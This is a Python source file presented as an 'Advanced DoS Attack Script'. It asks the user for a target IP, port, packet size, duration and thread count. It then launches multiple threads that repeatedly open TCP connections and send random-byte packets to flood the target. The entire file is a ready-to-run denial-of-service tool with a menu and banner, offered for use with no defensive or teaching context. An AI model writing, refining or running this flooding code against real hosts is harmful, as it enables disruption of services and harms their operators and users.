import socket
import random
import threading
import time
import os

# Function to clear the console screen
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Function to print the banner
def print_banner():
    print("-------------------------------------------")
    print("            _____    ____      ____        ")
    print("              |     |    |    |    |   |   ")
    print("(dot)(dot) |     |    |    |    |   |   ")
    print("  O    O      |     |____|    |____|   |___")
    print("-------------------------------------------")
    print("Advanced DoS Attack Script")
    print("Made by: EUMonk - Python")
    print("-------------------------------------------")
    print("\n")

# Function to measure ping to the target
def get_ping(ip, port):
    try:
        start_time = time.time()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect((ip, port))
        end_time = time.time()
        return int((end_time - start_time) * 1000)
    except Exception:
        return None  # Return None if the server is unreachable

# Function that performs the attack
def start_attack(ip, port, packet_size, duration):
    end_time = time.time() + duration
    packet = random._urandom(packet_size)  # Generate a random packet of specified size
    packets_sent = 0

    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                s.send(packet)  # Send the random packet
                packets_sent += 1
            print(f"Sent packet {packets_sent} to {ip}:{port}")
        except Exception as e:
            print(f"Error sending packet: {e}")
            time.sleep(1)  # Wait a bit before retrying

# Function to start multiple attack threads
def attack_menu():
    ip = input("Target IP: ")
    port = int(input("Port (must be a number): "))
    packet_size = int(input("Packet Size (bytes, e.g. 1024): "))
    duration = int(input("Attack Duration (seconds): "))
    thread_count = int(input("Number of Threads: "))

    clear_screen()
    print_banner()

    # Start attack threads
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=start_attack, args=(ip, port, packet_size, duration))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

# Main function to run the program
def main():
    clear_screen()
    print_banner()

    while True:
        print("\nSelect an option:")
        print("1) Start DoS Attack")
        print("2) Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            attack_menu()
        elif choice == "2":
            print("Exiting the program.")
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
